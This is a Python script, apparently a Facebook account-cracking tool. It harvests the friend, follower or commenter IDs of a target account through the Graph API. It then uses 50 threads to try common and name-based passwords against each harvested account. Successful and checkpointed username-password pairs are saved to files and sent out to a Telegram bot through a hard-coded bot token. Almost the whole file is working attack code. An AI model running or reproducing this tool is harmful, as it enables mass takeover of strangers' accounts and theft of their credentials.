
from multiprocessing.dummy import Pool
import os,random,time,re
try:
    import requests,colorama
except:
    os.system('pip install requests')
    os.system('python -m pip install requests')
    os.system('pip install colorama')
    os.system('python -m pip install colorama')
    import requests,colorama
    pass
else:pass

red=colorama.Fore.RED
white=colorama.Fore.WHITE
lightblack=colorama.Fore.LIGHTBLACK_EX
green=colorama.Fore.GREEN
yellow=colorama.Fore.YELLOW

ID=[]

TOKEN=['1297169682:AAGswLnECq6ihDNrt6sJzSnwz5F9e2Z7R90']



class run:

    def Successful(user,pasw):
        try:requests.get(f"https://api.telegram.org/bot{TOKEN[0]}/sendMessage?chat_id={ID[0]}&text=Successful {user}:{pasw}")
        except:pass
        a=open('OK.txt','a',encoding='utf-8')
        a.write(f'{user}:{pasw}\n')
        a.close()
        print(f'{green} [ HACKED ]{white} {user}:{pasw}')

    def Checkpoint(user,pasw):
        try:requests.get(f"https://api.telegram.org/bot{TOKEN[0]}/sendMessage?chat_id={ID[0]}&text=Checkpoint {user}:{pasw}")
        except:pass
        a=open('CP.txt','a',encoding='utf-8')
        a.write(f'{user}:{pasw}\n')
        a.close()
        print(f' {red}[ Checkpoint ]{white} {user}:{pasw}')


    def loop(ARG):
        try:
            user=str(ARG).split(':')[0]
            name=str(ARG).split(':')[1]
            pasw=f'1122334455'
            result=login.re_api(f"{user}",f"{pasw}")
            if "'status': 'ok'" in str(result):run.Successful(user,pasw)
            elif "'status': 'cp'" in str(result):run.Checkpoint(user,pasw)
            else:
                pasw2=f'1234512345'
                result2=login.re_api(f"{user}",f"{pasw2}")
                if "'status': 'ok'" in str(result2):run.Successful(user,pasw2)
                elif "'status': 'cp'" in str(result2):run.Checkpoint(user,pasw2)
                else:
                    pasw3=f'123456123456'
                    result3=login.re_api(f"{user}",f"{pasw3}")
                    if "'status': 'ok'" in str(result3):run.Successful(user,pasw3)
                    elif "'status': 'cp'" in str(result3):run.Checkpoint(user,pasw3)
                    else:
                        pasw4=f'{name}12'
                        result4=login.re_api(f"{user}",f"{pasw4}")
                        if "'status': 'ok'" in str(result4):run.Successful(user,pasw4)
                        elif "'status': 'cp'" in str(result4):run.Checkpoint(user,pasw4)
                        else:
                            pasw5=f'{name}123'
                            result5=login.re_api(f"{user}",f"{pasw5}")
                            if "'status': 'ok'" in str(result5):run.Successful(user,pasw5)
                            elif "'status': 'cp'" in str(result5):run.Checkpoint(user,pasw5)
                            else:
                                pasw6=f'{name}1234'
                                result6=login.re_api(f"{user}",f"{pasw6}")
                                if "'status': 'ok'" in str(result6):run.Successful(user,pasw6)
                                elif "'status': 'cp'" in str(result6):run.Checkpoint(user,pasw6)
                                else:
                                    pasw7=f'{name}12345'
                                    result7=login.re_api(f"{user}",f"{pasw7}")
                                    if "'status': 'ok'" in str(result7):run.Successful(user,pasw7)
                                    elif "'status': 'cp'" in str(result7):run.Checkpoint(user,pasw7)
                                    else:
                                        pasw8=f'{name}123456'
                                        result8=login.re_api(f"{user}",f"{pasw8}")
                                        if "'status': 'ok'" in str(result8):run.Successful(user,pasw8)
                                        elif "'status': 'cp'" in str(result8):run.Checkpoint(user,pasw8)
                                        else:
                                            pasw9=f'{name}1234567'
                                            result9=login.re_api(f"{user}",f"{pasw9}")
                                            if "'status': 'ok'" in str(result9):run.Successful(user,pasw9)
                                            elif "'status': 'cp'" in str(result9):run.Checkpoint(user,pasw9)
                                            else:
                                                pasw10=f'{name}12345678'
                                                result10=login.re_api(f"{user}",f"{pasw10}")
                                                if "'status': 'ok'" in str(result10):run.Successful(user,pasw10)
                                                elif "'status': 'cp'" in str(result10):run.Checkpoint(user,pasw10)
                                                else:
                                                    pasw11=f'{name}1212'
                                                    result11=login.re_api(f"{user}",f"{pasw11}")
                                                    if "'status': 'ok'" in str(result11):run.Successful(user,pasw11)
                                                    elif "'status': 'cp'" in str(result11):run.Checkpoint(user,pasw11)
                                                    else:
                                                        pasw12=f'{name}1010'
                                                        result12=login.re_api(f"{user}",f"{pasw12}")
                                                        if "'status': 'ok'" in str(result12):run.Successful(user,pasw12)
                                                        elif "'status': 'cp'" in str(result12):run.Checkpoint(user,pasw12)
                                                        else:
                                                            pasw13=f'{name}1122'
                                                            result13=login.re_api(f"{user}",f"{pasw13}")
                                                            if "'status': 'ok'" in str(result13):run.Successful(user,pasw13)
                                                            elif "'status': 'cp'" in str(result13):run.Checkpoint(user,pasw13)
                                                            else:
                                                                pasw14=f'{name}1122334455'
                                                                result14=login.re_api(f"{user}",f"{pasw14}")
                                                                if "'status': 'ok'" in str(result14):run.Successful(user,pasw14)
                                                                elif "'status': 'cp'" in str(result14):run.Checkpoint(user,pasw14)
                                                                else:
                                                                    pasw15=f'{name}54321'
                                                                    result15=login.re_api(f"{user}",f"{pasw15}")
                                                                    if "'status': 'ok'" in str(result15):run.Successful(user,pasw15)
                                                                    elif "'status': 'cp'" in str(result15):run.Checkpoint(user,pasw15)
                                                                    else:
                                                                        pasw16=f'{name}4321'
                                                                        result16=login.re_api(f"{user}",f"{pasw14}")
                                                                        if "'status': 'ok'" in str(result16):run.Successful(user,pasw16)
                                                                        elif "'status': 'cp'" in str(result16):run.Checkpoint(user,pasw16)
                                                                        else:
                                                                            pasw17=f'{name}321'
                                                                            result17=login.re_api(f"{user}",f"{pasw17}")
                                                                            if "'status': 'ok'" in str(result17):run.Successful(user,pasw17)
                                                                            elif "'status': 'cp'" in str(result17):run.Checkpoint(user,pasw17)
                                                                            else:pass

        except:pass

class user_agent:
    def UG():
        ua_intelmac= 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]'
        ua_asus    = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]'
        ua_huawei  = 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]' #DONE
        ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]'
        ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
        return [
                ua_intelmac,
                ua_asus,
                ua_huawei,
                ua_samsung,
                ua_xiaomi
                 ]

class login: 
    def re_api(user,pasw):
        url_login=random.choice(['free.facebook.com',"m.facebook.com"])
        with requests.Session() as xyz:
            req  = xyz.get(f'https://{url_login}')
            log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":random.choice(user_agent.UG()),"sec-fetch-site":"same-origin"}
            exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict():
                var=xyz.cookies.get_dict()
                cookies=f'sb='+var['sb']+'; datr='+var['datr']+'; c_user='+var['c_user']+'; xs='+var['xs']+'; fr='+var['fr']
                return {"status":"ok","email":user,"pass":pasw,"cookies":f'{cookies}'}
            elif 'checkpoint' in xyz.cookies.get_dict():return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else:return {"status":"error","email":user,"pass":pasw}

    def to_get_id(user,pasw):
        url_login=random.choice(['free.facebook.com',"m.facebook.com"])
        with requests.Session() as xyz:
            try:
                req  = xyz.get(f'https://{url_login}')
                log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
                head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","sec-fetch-site":"same-origin"}
                exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
                if 'c_user' in xyz.cookies.get_dict():
                    var=xyz.cookies.get_dict()
                    cookie=f'sb='+var['sb']+'; datr='+var['datr']+'; c_user='+var['c_user']+'; xs='+var['xs']+'; fr='+var['fr']
                    token=(re.search("(EAAG\w+)", xyz.get("https://business.facebook.com/business_locations", headers={"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type": "text/html; charset=utf-8"}, cookies={"cookie": cookie}).text).group(1))
                    return {"token":f"{token}","cookie":f"{cookie}"}
                else:return False
            except:return False

class main:
    def Global(self):
        print(f'''\n{lightblack} --login---------------------------{white}\n''')
        username=input(' User/Num/Email : ')
        password=input(' Password : ')
        print(f'''{lightblack} ----------------------------------{white}''')
        var=login.to_get_id(username,password)
        if var==False:
            print('sign-in failed')
            time.sleep(5)
            self.GO()
        else:
            print(f' {lightblack}-- Sign-in was successfully.{white}')
            def lop():
                TOKEN_=(var['token'])
                COOKIE=(var['cookie'])
                print(f'''{lightblack} ------------------------------vip-{white}''')
                print(f' 1 - Public ID ( {red}New{white} )')
                print(f' 2 - Folowers ID ( {red}New{white} )')
                print(f' 3 - POST ID ( {red}New{white} )')
                print(' 0 - Back')
                halbzhardn=input(' Choice: ')
                if halbzhardn=='0':self.GO()
                elif halbzhardn=='1':
                    print(f'''{lightblack} ----------------------------------{white}''')
                    ididid=input(' Target ID : ')
                    print(f'''{lightblack} ----------------------------------{white}''')
                    iD=[]
                    try:
                        API= requests.Session().get(f'https://graph.facebook.com/{ididid}?fields=friends.fields(id,name)&access_token={TOKEN_}', cookies={'cookie':f'{COOKIE}'}).json()
                        for i in API['friends']['data']:
                            try:
                                name=str(i['name']).split(' ')[0]
                                idd=i['id']
                                l=f'{idd}:{name}'
                                iD.append(str(l))
                            except:pass
                        print(f' {lightblack}-- Has been collect all ID :){white}')
                        print(f'''{lightblack} ----------------------------------{white}\n Bot== https://t.me/FB_TOOL_CRACKED_BOT''')
                        idd=input(' Telegram ID : ')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        ID.clear()
                        ID.append(idd)
                        print(f'\n -- Please wait a few hours..')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        TH=Pool(50)
                        TH.map(run.loop,iD)
                        input('\n Enter to Return:-')
                        lop()
                    except:
                        print(f' {lightblack}--Your ID doesn\'t work{white}')
                        input('\n Enter to Return:-')
                        lop()
                    input('\n Enter to Return:-')
                    lop()
                elif halbzhardn=='2':
                    print(f'''{lightblack} ----------------------------------{white}''')
                    ididid=input(' Target ID : ')
                    print(f'''{lightblack} ----------------------------------{white}''')
                    iD=[]
                    try:
                        API= requests.Session().get(f'https://graph.facebook.com/{ididid}/subscribers?limit=10000&access_token={TOKEN_}', cookies={'cookie':f'{COOKIE}'}).json()
                        c_=0
                        for i in API['data']:
                            try:
                                if c_==7000:break
                                else:
                                    name=str(i['name']).split(' ')[0]
                                    idd=(i['id'])
                                    l=f'{idd}:{name}'
                                    iD.append(str(l))
                                    c_+=1
                            except:pass
                        print(f' {lightblack}-- Has been collect all ID :){white}')
                        print(f'''{lightblack} ----------------------------------{white}\n Bot== https://t.me/FB_TOOL_CRACKED_BOT''')
                        idd=input(' Telegram ID : ')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        ID.clear()
                        ID.append(idd)
                        print(f'\n -- Please wait a few hours..')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        TH=Pool(50)
                        TH.map(run.loop,iD)
                        input('\n Enter to Return:-')
                        lop()
                    except:
                        print(f' {lightblack}--Your ID doesn\'t work{white}')
                        input('\n Enter to Return:-')
                        lop()
                    input('\n Enter to Return:-')
                    lop()
                elif halbzhardn=='3':
                    print(f'''{lightblack} ----------------------------------{white}''')
                    ididid=input(' Target ID : ')
                    print(f'''{lightblack} ----------------------------------{white}''')
                    iD=[]
                    try:
                        API= requests.Session().get(f'https://graph.facebook.com/{ididid}/comments?access_token={TOKEN_}', cookies={'cookie':f'{COOKIE}'}).json()
                        c_=0
                        for i in API['data']:
                            try:
                                if c_==7000:break
                                else:
                                    name=str(i['from']['name']).split(' ')[0]
                                    idd=(i['from']['id'])
                                    l=f'{idd}:{name}'
                                    iD.append(str(l))
                                    c_+=1
                            except:pass
                        print(f' {lightblack}-- Has been collect all ID :){white}')
                        print(f'''{lightblack} ----------------------------------{white}\n Bot== https://t.me/FB_TOOL_CRACKED_BOT''')
                        idd=input(' Telegram ID : ')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        ID.clear()
                        ID.append(idd)
                        print(f'\n -- Please wait a few hours..')
                        print(f'''{lightblack} ----------------------------------{white}''')
                        TH=Pool(50)
                        TH.map(run.loop,iD)
                        input('\n Enter to Return:-')
                        lop()
                    except:
                        print(f' {lightblack}--Your ID doesn\'t work{white}')
                        input('\n Enter to Return:-')
                        lop()
                    input('\n Enter to Return:-')
                    lop()
                else:lop()
            lop()

    def GO(self):
        self.logo()
        self.Global()

    def __init__(self):
        self.GO()

    def logo(self):
        if os.name=='nt':os.system('cls')
        else:os.system('clear')
        print(red+''' 
         
███████╗██████╗     ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
██╔════╝██╔══██╗    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
█████╗  ██████╔╝    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
██╔══╝  ██╔══██╗    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
██║     ██████╔╝    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
╚═╝     ╚═════╝     ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
                                            
'''+white)

def chk():

  try:
    httpCaht = requests.get("https://textuploader.com/t1gd3/raw").text
    if "LINUX" in httpCaht:
        main()

        pass
    else:
      input("\nError haya nama Bnera bo telegram @Mohamed_Linux ")
      time.sleep(1)
      exit()
  except:
    exit()

if __name__=="__main__":
    chk()
